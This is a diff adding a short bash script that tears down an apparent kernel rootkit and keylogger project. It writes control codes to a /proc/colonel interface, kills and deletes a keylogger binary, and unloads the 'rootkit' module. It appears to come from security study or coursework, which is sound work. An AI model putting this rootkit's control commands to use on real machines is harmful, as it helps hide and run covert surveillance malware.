@@ -1,0 +1,14 @@
+#!/bin/bash
+
+cd lkm/
+
+# remove keylogger
+echo -n sp >> /proc/colonel
+echo -n sp >> /proc/colonel
+sudo killall col_kl
+rm col_kl
+
+# cleanup the rootkit
+echo -n ms >> /proc/colonel
+sudo rmmod rootkit
+make clean
